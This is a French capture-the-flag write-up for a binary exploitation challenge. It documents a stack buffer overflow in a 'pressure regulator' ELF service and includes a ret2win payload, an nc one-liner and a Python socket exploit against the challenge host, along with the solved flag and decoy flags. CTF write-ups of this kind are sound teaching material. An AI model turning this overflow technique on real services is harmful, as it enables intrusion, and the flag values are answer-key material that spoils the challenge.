# Le régulateur de pression (HacKagou 2026) — Pwn

**Flag :** `OPENNC{6df8f0d6-aad5-4a75-bba3-65ff407c753a}`
**Valeur :** 100 pts · **Auteur :** Yoan
**Statut :** ✅ **résolu** (soumis `correct` le 2026-10-01) — exploit lancé contre l'instance `nc challs.hackagou.nc 47228`, `/flag` lu via `print_flag_file`.

## Énoncé

> Régulateur à **cartes perforées**. « Seuls les registres `0` à `15` sont adressables. Le registre d'administration `16` (purge d'urgence) reste hors de portée. » Mission : forcer l'ouverture de la valve de purge (registre 16) et récupérer le journal de Varn. Service `nc`, binaire fourni.

Fichier : `regulateur` (ELF x86-64, dynamique, **not stripped**).

## Reconnaissance

```
$ file 41_regulateur
ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped
$ readelf -lW 41_regulateur | grep STACK   # GNU_STACK ... RW  -> NX, pas d'exec stack
```
- **No-PIE** : les adresses sont fixes (`main` à `0x401431`) → pas besoin de fuite.
- **Pas de canary** (aucun `__stack_chk_fail`).

Chaînes révélatrices — **deux flags hardcodés sont des leurres explicites** :
```
[x] admin_valve     : OPENNC{v4lv3_tr4p_n0t_th3_r34l_0n3}   <- piège ("not the real one")
[x] emergency_flush : OPENNC{fake_flush_d3adend}            <- piège
print_flag_file  -> fopen("/flag","r") ; affiche son contenu
[!] /flag introuvable sur cette instance.
```
Les fonctions `admin_valve` / `leviathan_key` / `emergency_flush` ne font qu'`puts()` un leurre puis `exit(0)`. Le **vrai** flag est lu depuis `/flag` par `print_flag_file` (`0x401207`).

## Vulnérabilité

Menu → option `2` → `punch_card_reader` :

```asm
punch_card_reader:
  sub    rsp, 0x40                  ; buffer local de 64 octets  [rbp-0x40]
  ...
  lea    rax, [rbp-0x40]
  mov    edx, 0x100                 ; **256**
  mov    rsi, rax
  mov    edi, 0
  call   read@plt                   ; read(0, buf, 0x100) -> 256 octets dans 64 => OVERFLOW
  printf("Carte lue : %.10s...", buf)
  leave ; ret
```

`read` accepte **256** octets dans un tampon de **64** : débordement de pile classique, sans canary → on contrôle l'adresse de retour.

Offset jusqu'à l'adresse de retour : `0x40` (buffer) + `0x08` (saved rbp) = **72**.

## Exploitation

Rediriger le `ret` vers `print_flag_file` (0x401207). L'alignement de pile est correct tel quel (aucun gadget `ret` supplémentaire nécessaire — vérifié).

```python
payload = b"2\n" + b"A"*72 + p64(0x401207) + b"\n"
```

### Vérification locale (sans le vrai /flag)

```
$ ./41_regulateur < payload
...
Pression inchangee. Registre 16 inaccessible par ce canal.
[!] /flag introuvable sur cette instance.      <-- print_flag_file atteint ✔
```
Le message provient de `print_flag_file` (échec de `fopen("/flag")`) : la redirection fonctionne. Sur l'instance, où `/flag` existe, le contenu s'affiche.

### Contre l'instance

```bash
# démarrer l'instance du challenge, récupérer host:port, puis :
python3 exploit.py challs.hackagou.nc <port>
# ou à la main :
( printf '2\n'; python3 -c "import sys;sys.stdout.buffer.write(b'A'*72+b'\x07\x12\x40\x00\x00\x00\x00\x00')"; echo ) | nc challs.hackagou.nc <port>
```

Script complet : [`exploit.py`](exploit.py).

### Résolution effective (sans pwntools)

La session Ubuntu n'avait pas `pwn` ; l'exploit est de toute façon déterministe
(No-PIE, adresse fixe, pas de leak), rejoué en **socket Python pur** :

```python
import socket, struct, time
s = socket.create_connection(("challs.hackagou.nc", 47228), timeout=10)
s.sendall(b"2\n" + b"A"*72 + struct.pack("<Q", 0x401207) + b"\n")
time.sleep(1.5); s.settimeout(4)
data=b""
try:
    while True:
        c=s.recv(4096)
        if not c: break
        data+=c
except socket.timeout: pass
print(data.decode(errors="replace"))
```

Sortie : après « Pression inchangee. Registre 16 inaccessible par ce canal. »,
`print_flag_file` affiche le contenu de `/flag`.

> Note infra : le port `nc` répond `Connection refused` les premières secondes
> après le lancement de l'instance (conteneur pas encore prêt) — réessayer une
> fois le TCP ouvert. L'instance whale a un TTL court et se détruit seule
> (`DELETE` renvoie alors `No such container`).

## Flag

```
OPENNC{6df8f0d6-aad5-4a75-bba3-65ff407c753a}
```
